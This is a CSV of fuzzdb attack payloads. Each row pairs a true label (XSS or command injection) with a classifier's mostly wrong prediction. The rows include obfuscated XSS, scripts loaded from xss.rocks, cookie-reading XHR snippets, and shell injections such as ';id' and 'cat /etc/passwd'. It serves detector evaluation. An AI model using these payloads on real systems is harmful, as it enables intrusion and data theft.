id,payload,actual,predicted
fuzzdb_2086,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",xss,benign
fuzzdb_2087,"<SCRIPT/SRC=""http:&#47;&#47;xss.rocks/xss.js""></SCRIPT>",xss,sql_injection
fuzzdb_2088,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",xss,sql_injection
fuzzdb_2089,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",xss,sql_injection
fuzzdb_2090,"<SCRIPT\s"" != ""<SCRIPT/XSS\s';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,sql_injection
fuzzdb_2091,<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#,xss,sql_injection
fuzzdb_2094,"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",xss,sql_injection
fuzzdb_2102,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",xss,sql_injection
fuzzdb_2104,<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss,benign
fuzzdb_2111,"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss,sql_injection
fuzzdb_2112,"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",xss,sql_injection
fuzzdb_2118,"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",xss,sql_injection
fuzzdb_2133,alert,xss,benign
fuzzdb_2134,alert&lpar;1&rpar;,xss,benign
fuzzdb_2135,alert(1),xss,benign
fuzzdb_2136,alert\\`1\\`,xss,benign
fuzzdb_2137,alert`1`,xss,benign
fuzzdb_2139,http://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe,xss,benign
fuzzdb_2140,http://www.<script>alert(1)</script .com,xss,benign
fuzzdb_2141,https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/xss/test.xxe,xss,benign
fuzzdb_2144,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==,xss,benign
fuzzdb_2146,[[#%3Cscript%3Ealert(1)%3C/script%3E|,xss,sql_injection
fuzzdb_2147,a{b:`function(){alert(1)}()`;},xss,benign
fuzzdb_2148,"""><style type=text/less>a{b:`function(){alert(1)}()`;}</style>",xss,benign
fuzzdb_2150,"'';!--""<XSS>=&{()}",xss,sql_injection
fuzzdb_2158,SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,sql_injection
fuzzdb_2159,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,sql_injection
fuzzdb_2160,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss,sql_injection
fuzzdb_2162,"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2163,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2164,"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2165,"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss,sql_injection
fuzzdb_2168,"<SCR%00IPT>alert(\""XSS\"")</SCR%00IPT>",xss,benign
fuzzdb_2170,<SCRIPT SRC=http://xss.rocks/xss.js?<B>,xss,benign
fuzzdb_2172,<SCRIPT>a=/XSS/,xss,benign
fuzzdb_2173,"\"";alert('XSS');//",xss,benign
fuzzdb_2180,"<BR SIZE=""&{alert('XSS')}"">",xss,benign
fuzzdb_2181,"<LAYER SRC=""http://xss.rocks/scriptlet.html""></LAYER>",xss,benign
fuzzdb_2183,"<LINK REL=""stylesheet"" HREF=""http://xss.rocks/xss.css"">",xss,benign
fuzzdb_2184,<STYLE>@import'http://xss.rocks/xss.css';</STYLE>,xss,benign
fuzzdb_2185,"<META HTTP-EQUIV=""Link"" Content=""<http://xss.rocks/xss.css>; REL=stylesheet"">",xss,benign
fuzzdb_2186,"<STYLE>BODY{-moz-binding:url(""http://xss.rocks/xssmoz.xml#xss"")}</STYLE>",xss,sql_injection
fuzzdb_2198,"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss,sql_injection
fuzzdb_2199,"<DIV STYLE=""width: expression(alert('XSS'));"">",xss,benign
fuzzdb_2200,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss,benign
fuzzdb_2201,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss,sql_injection
fuzzdb_2202,"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss,benign
fuzzdb_2203,"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",xss,sql_injection
fuzzdb_2204,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss,benign
fuzzdb_2211,"a=""get"";",xss,benign
fuzzdb_2212,"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",xss,sql_injection
fuzzdb_2213,"<XML SRC=""http:/xss.rocks/xsstest.xml"" ID=I></XML>",xss,benign
fuzzdb_2214,<HTML><BODY>,xss,benign
fuzzdb_2216,"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://xss.rocks/xss.js></SCRIPT>'""-->",xss,sql_injection
fuzzdb_2217,<? echo('<SCR)';,xss,benign
fuzzdb_2218,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",xss,benign
fuzzdb_2219,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss,benign
fuzzdb_2225,"aim: &c:\windows\system32\calc.exe"" ini=""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat""",xss,benign
fuzzdb_2228,res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210,xss,sql_injection
fuzzdb_2231,"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",xss,sql_injection
fuzzdb_2232,"/*-/*`/*\`/*'/*""/**/",xss,sql_injection
fuzzdb_2233,(/* */oNcliCk=alert() ),xss,sql_injection
fuzzdb_2234,//%0D%0A%0D%0A//,xss,benign
fuzzdb_2235,</stYle/</titLe/</teXtarEa/</scRipt/--!>,xss,sql_injection
fuzzdb_2237,"<input type='text' value='jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'></input>",xss,sql_injection
fuzzdb_2238,"<input type=text value=jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>",xss,sql_injection
fuzzdb_2239,<img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>,xss,sql_injection
fuzzdb_2240,"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>",xss,sql_injection
fuzzdb_2241,"<math xlink:href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</math>",xss,sql_injection
fuzzdb_2242,"<iframe src=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e""></iframe>",xss,sql_injection
fuzzdb_2243,"<!--jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e-->",xss,sql_injection
fuzzdb_2244,"<style>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</style>",xss,sql_injection
fuzzdb_2245,"<textarea>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</textarea>",xss,sql_injection
fuzzdb_2246,"<div>jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</div>",xss,sql_injection
fuzzdb_2247,"var str = ""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"";",xss,sql_injection
fuzzdb_2248,"var str = 'jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e';",xss,sql_injection
fuzzdb_2249,"<script>//jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</script>",xss,sql_injection
fuzzdb_2250,"<script>/*jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e*/</script>",xss,sql_injection
fuzzdb_2252,setTimeout(location.search.slice(1));,xss,benign
fuzzdb_2253,jaVasCript:/-/%60/%5C%60/'/%22//(/%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E%3E,xss,sql_injection
fuzzdb_2254,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.documentElement.innerHTML = data;",xss,sql_injection
fuzzdb_2255,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.head.outerHTML = data;",xss,sql_injection
fuzzdb_2256,"var data = ""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"";document.write(data);document.close();",xss,sql_injection
fuzzdb_2257,"<!--#exec cmd=""/usr/bin/id""-->",cmd_injection,sql_injection
fuzzdb_2258,"<!--#exec cmd=""id""-->",cmd_injection,sql_injection
fuzzdb_2259,/index.html|id|,cmd_injection,benign
fuzzdb_2260,;id;,cmd_injection,benign
fuzzdb_2261,;id,cmd_injection,benign
fuzzdb_2262,;netstat -a;,cmd_injection,benign
fuzzdb_2263,;id;,cmd_injection,benign
fuzzdb_2264,|id,cmd_injection,benign
fuzzdb_2265,|/usr/bin/id,cmd_injection,benign
fuzzdb_2266,|id|,cmd_injection,benign
fuzzdb_2267,|/usr/bin/id|,cmd_injection,benign
fuzzdb_2268,||/usr/bin/id|,cmd_injection,benign
fuzzdb_2269,|id;,cmd_injection,benign
fuzzdb_2270,||/usr/bin/id;,cmd_injection,benign
fuzzdb_2271,;id|,cmd_injection,benign
fuzzdb_2272,;|/usr/bin/id|,cmd_injection,benign
fuzzdb_2273,\n/bin/ls -al\n,cmd_injection,benign
fuzzdb_2274,\n/usr/bin/id\n,cmd_injection,benign
fuzzdb_2275,\nid\n,cmd_injection,benign
fuzzdb_2276,\n/usr/bin/id;,cmd_injection,benign
fuzzdb_2277,\nid;,cmd_injection,benign
fuzzdb_2278,\n/usr/bin/id|,cmd_injection,benign
fuzzdb_2279,\nid|,cmd_injection,benign
fuzzdb_2280,;/usr/bin/id\n,cmd_injection,benign
fuzzdb_2281,;id\n,cmd_injection,benign
fuzzdb_2282,|usr/bin/id\n,cmd_injection,benign
fuzzdb_2283,|nid\n,cmd_injection,benign
fuzzdb_2284,`id`,cmd_injection,benign
fuzzdb_2285,`/usr/bin/id`,cmd_injection,benign
fuzzdb_2286,a);id,cmd_injection,benign
fuzzdb_2287,a;id,cmd_injection,benign
fuzzdb_2288,a);id;,cmd_injection,benign
fuzzdb_2289,a;id;,cmd_injection,benign
fuzzdb_2290,a);id|,cmd_injection,benign
fuzzdb_2291,a;id|,cmd_injection,benign
fuzzdb_2292,a)|id,cmd_injection,benign
fuzzdb_2293,a|id,cmd_injection,benign
fuzzdb_2294,a)|id;,cmd_injection,benign
fuzzdb_2295,a|id,cmd_injection,benign
fuzzdb_2296,|/bin/ls -al,cmd_injection,benign
fuzzdb_2297,a);/usr/bin/id,cmd_injection,benign
fuzzdb_2298,a;/usr/bin/id,cmd_injection,benign
fuzzdb_2299,a);/usr/bin/id;,cmd_injection,benign
fuzzdb_2300,a;/usr/bin/id;,cmd_injection,benign
fuzzdb_2301,a);/usr/bin/id|,cmd_injection,benign
fuzzdb_2302,a;/usr/bin/id|,cmd_injection,benign
fuzzdb_2303,a)|/usr/bin/id,cmd_injection,benign
fuzzdb_2304,a|/usr/bin/id,cmd_injection,benign
fuzzdb_2305,a)|/usr/bin/id;,cmd_injection,benign
fuzzdb_2306,a|/usr/bin/id,cmd_injection,benign
fuzzdb_2307,;system('cat%20/etc/passwd'),cmd_injection,benign
fuzzdb_2308,;system('id'),cmd_injection,benign
fuzzdb_2309,;system('/usr/bin/id'),cmd_injection,benign
fuzzdb_2310,%0Acat%20/etc/passwd,cmd_injection,benign
fuzzdb_2311,%0A/usr/bin/id,cmd_injection,benign
fuzzdb_2312,%0Aid,cmd_injection,benign
fuzzdb_2313,%0A/usr/bin/id%0A,cmd_injection,benign
fuzzdb_2314,%0Aid%0A,cmd_injection,benign
fuzzdb_2315,& ping -i 30 127.0.0.1 &,cmd_injection,benign
fuzzdb_2316,& ping -n 30 127.0.0.1 &,cmd_injection,benign
fuzzdb_2317,%0a ping -i 30 127.0.0.1 %0a,cmd_injection,benign
fuzzdb_2318,`ping 127.0.0.1`,cmd_injection,benign
fuzzdb_2319,| id,cmd_injection,benign
fuzzdb_2320,& id,cmd_injection,benign
fuzzdb_2321,; id,cmd_injection,benign
fuzzdb_2322,%0a id %0a,cmd_injection,benign
fuzzdb_2323,`id`,cmd_injection,benign
fuzzdb_2324,$;/usr/bin/id,cmd_injection,benign
fuzzdb_2325,{cmd},cmd_injection,benign
fuzzdb_2326,;{cmd},cmd_injection,benign
fuzzdb_2327,;{cmd};,cmd_injection,benign
fuzzdb_2328,^{cmd},cmd_injection,benign
fuzzdb_2329,|{cmd},cmd_injection,benign
fuzzdb_2330,<{cmd},cmd_injection,benign
fuzzdb_2331,<{cmd};,cmd_injection,benign
fuzzdb_2332,<{cmd}\n,cmd_injection,benign
fuzzdb_2333,<{cmd}%0D,cmd_injection,benign
fuzzdb_2334,<{cmd}%0A,cmd_injection,benign
fuzzdb_2335,&{cmd},cmd_injection,benign
fuzzdb_2336,&{cmd}&,cmd_injection,benign
fuzzdb_2337,&&{cmd},cmd_injection,benign
fuzzdb_2338,&&{cmd}&&,cmd_injection,benign
fuzzdb_2339,%0D{cmd},cmd_injection,benign
fuzzdb_2340,%0D{cmd}%0D,cmd_injection,benign
fuzzdb_2341,%0A{cmd},cmd_injection,benign
fuzzdb_2342,%0A{cmd}%0A,cmd_injection,benign
fuzzdb_2343,\n{cmd},cmd_injection,benign
fuzzdb_2344,\n{cmd}\n,cmd_injection,benign
fuzzdb_2345,'{cmd}',cmd_injection,benign
fuzzdb_2346,`{cmd}`,cmd_injection,benign
fuzzdb_2347,;{cmd}|,cmd_injection,benign
fuzzdb_2348,;{cmd}/n,cmd_injection,benign
fuzzdb_2349,|{cmd};,cmd_injection,benign
fuzzdb_2350,a);{cmd},cmd_injection,benign
fuzzdb_2351,a;{cmd},cmd_injection,benign
fuzzdb_2352,a);{cmd},cmd_injection,benign
fuzzdb_2353,a;{cmd};,cmd_injection,benign
fuzzdb_2354,a);{cmd}|,cmd_injection,benign
fuzzdb_2355,FAIL||{cmd},cmd_injection,benign
fuzzdb_2356,CMD=$'{cmd}';$CMD,cmd_injection,benign
fuzzdb_2358,^CMD=$'{cmd}';$CMD,cmd_injection,benign
fuzzdb_2362,%0DCMD=$'{cmd}';$CMD,cmd_injection,benign
fuzzdb_2364,CMD=$\'{cmd}\';$CMD,cmd_injection,benign
fuzzdb_2366,^CMD=$\'{cmd}\';$CMD,cmd_injection,benign
fuzzdb_2370,%0DCMD=$\'{cmd}\';$CMD,cmd_injection,benign
fuzzdb_2372,"CMD=$""{cmd}"";$CMD",cmd_injection,benign
fuzzdb_2374,"^CMD=$""{cmd}"";$CMD",cmd_injection,benign
fuzzdb_2378,"%0DCMD=$""{cmd}"";$CMD",cmd_injection,benign
fuzzdb_2380,"<!--#exec cmd=""{cmd}""-->",cmd_injection,sql_injection
fuzzdb_2381,;system('{cmd}'),cmd_injection,benign
fuzzdb_2382,accept,cmd_injection,benign
fuzzdb_2383,access,cmd_injection,benign
fuzzdb_2384,aclocal,cmd_injection,benign
fuzzdb_2385,aconnect,cmd_injection,benign
fuzzdb_2386,acpi,cmd_injection,benign
fuzzdb_2387,acpi_available,cmd_injection,benign
fuzzdb_2388,acpid,cmd_injection,benign
fuzzdb_2389,addr2line,cmd_injection,benign
fuzzdb_2390,addresses,cmd_injection,benign
fuzzdb_2391,agetty,cmd_injection,benign
fuzzdb_2392,alsactl,cmd_injection,benign
fuzzdb_2393,amidi,cmd_injection,benign
fuzzdb_2394,amixer,cmd_injection,benign
fuzzdb_2395,anacron,cmd_injection,benign
fuzzdb_2396,aplay,cmd_injection,benign
fuzzdb_2397,aplaymidi,cmd_injection,benign
fuzzdb_2398,apm,cmd_injection,benign
fuzzdb_2399,apmd,cmd_injection,benign
fuzzdb_2400,apropos,cmd_injection,benign
fuzzdb_2401,apt,cmd_injection,benign
fuzzdb_2402,ar,cmd_injection,benign
fuzzdb_2403,arch,cmd_injection,benign
fuzzdb_2404,arecord,cmd_injection,benign
fuzzdb_2405,arecordmidi,cmd_injection,benign
fuzzdb_2406,arp,cmd_injection,benign
fuzzdb_2407,as,cmd_injection,benign
fuzzdb_2408,at,cmd_injection,benign
fuzzdb_2409,atd,cmd_injection,benign
fuzzdb_2410,atq,cmd_injection,benign
fuzzdb_2411,atrm,cmd_injection,benign
fuzzdb_2412,audiosend,cmd_injection,benign
fuzzdb_2413,aumix,cmd_injection,benign
fuzzdb_2414,autoconf,cmd_injection,benign
fuzzdb_2415,autoheader,cmd_injection,benign
fuzzdb_2416,automake,cmd_injection,benign
fuzzdb_2417,autoreconf,cmd_injection,benign
fuzzdb_2418,autoscan,cmd_injection,benign
fuzzdb_2419,autoupdate,cmd_injection,benign
fuzzdb_2420,badblocks,cmd_injection,benign
fuzzdb_2421,banner,cmd_injection,benign
fuzzdb_2422,basename,cmd_injection,benign
fuzzdb_2423,bash,cmd_injection,benign
fuzzdb_2424,batch,cmd_injection,benign
fuzzdb_2425,bc,cmd_injection,benign
fuzzdb_2426,biff,cmd_injection,benign
fuzzdb_2427,bison,cmd_injection,benign
fuzzdb_2428,bzcmp,cmd_injection,benign
fuzzdb_2429,bzdiff,cmd_injection,benign
fuzzdb_2430,bzgrep,cmd_injection,benign
fuzzdb_2431,bzip2,cmd_injection,benign
fuzzdb_2432,bzless,cmd_injection,benign
fuzzdb_2433,bzmore,cmd_injection,benign
fuzzdb_2434,c++,cmd_injection,benign
fuzzdb_2435,cal,cmd_injection,benign
fuzzdb_2436,cardctl,cmd_injection,benign
fuzzdb_2437,cardmgr,cmd_injection,benign
fuzzdb_2438,cat,cmd_injection,benign
fuzzdb_2439,cc,cmd_injection,benign
fuzzdb_2440,cdda2wav,cmd_injection,benign
fuzzdb_2441,cdparanoia,cmd_injection,benign
fuzzdb_2442,cdrdao,cmd_injection,benign
fuzzdb_2443,cdrecord,cmd_injection,benign
fuzzdb_2444,cfdisk,cmd_injection,benign
fuzzdb_2445,c++filt,cmd_injection,benign
fuzzdb_2446,chage,cmd_injection,benign
fuzzdb_2447,chattr,cmd_injection,benign
fuzzdb_2448,chfn,cmd_injection,benign
fuzzdb_2449,chgrp,cmd_injection,benign
fuzzdb_2450,chkconfig,cmd_injection,benign
fuzzdb_2451,chmod,cmd_injection,benign
fuzzdb_2452,chown,cmd_injection,benign
fuzzdb_2453,chpasswd,cmd_injection,benign
fuzzdb_2454,chroot,cmd_injection,benign
fuzzdb_2455,chrt,cmd_injection,benign
fuzzdb_2456,chsh,cmd_injection,benign
fuzzdb_2457,chvt,cmd_injection,benign
